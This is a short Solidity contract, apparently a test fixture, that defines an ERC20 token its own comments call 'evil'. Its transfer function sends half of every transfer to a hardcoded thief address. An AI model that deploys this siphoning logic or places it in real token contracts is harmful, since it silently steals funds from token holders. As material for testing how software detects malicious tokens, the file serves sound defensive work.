// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./@openzeppelin/contracts/token/ERC20/presets/ERC20PresetMinterPauser.sol";

// This is an evil token. Whenever an A -> B transfer is called, half of the amount goes to B
// and half to a predefined C
contract ERC20DirectBalanceManipulation is ERC20PresetMinterPauser {
  address private _thief = 0x4dC6ac40Af078661fc43823086E1513635Eeab14;
  constructor(uint256 initialSupply)
    ERC20PresetMinterPauser("ERC20DirectBalanceManipulation", "ERC20DirectBalanceManipulation") {
      _setupRole(DEFAULT_ADMIN_ROLE, msg.sender);
      _mint(msg.sender, initialSupply);
  }
  function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
    // Any time a transaction happens, the thief account siphons half.
    uint256 half = amount / 2;

    super.transfer(_thief, amount - half); // a - h for rounding
    return super.transfer(recipient, half);
  }
}